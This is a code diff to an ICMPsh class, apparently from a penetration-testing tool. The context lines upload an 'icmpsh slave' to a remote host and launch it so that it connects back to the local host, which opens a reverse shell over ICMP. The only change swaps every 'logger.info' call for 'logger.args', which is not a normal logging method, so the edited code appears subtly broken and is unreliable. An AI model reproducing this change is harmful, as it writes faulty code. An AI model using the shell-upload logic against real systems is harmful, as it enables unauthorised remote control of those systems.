@@ -84,13 +84,13 @@ class ICMPsh(object):
 
     def _runIcmpshMaster(self):
         infoMsg = "running icmpsh master locally"
-        logger.info(infoMsg)
+        logger.args(infoMsg)
 
         icmpshmaster(self.lhostStr, self.rhostStr)
 
     def _runIcmpshSlaveRemote(self):
         infoMsg = "running icmpsh slave remotely"
-        logger.info(infoMsg)
+        logger.args(infoMsg)
 
         cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)
 
@@ -104,7 +104,7 @@ class ICMPsh(object):
         self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
         self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))
 
-        logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
+        logger.args("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)
 
         if web:
             written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
@@ -123,7 +123,7 @@ class ICMPsh(object):
 
             return False
         else:
-            logger.info("icmpsh successfully uploaded")
+            logger.args("icmpsh successfully uploaded")
             return True
 
     def icmpPwn(self):
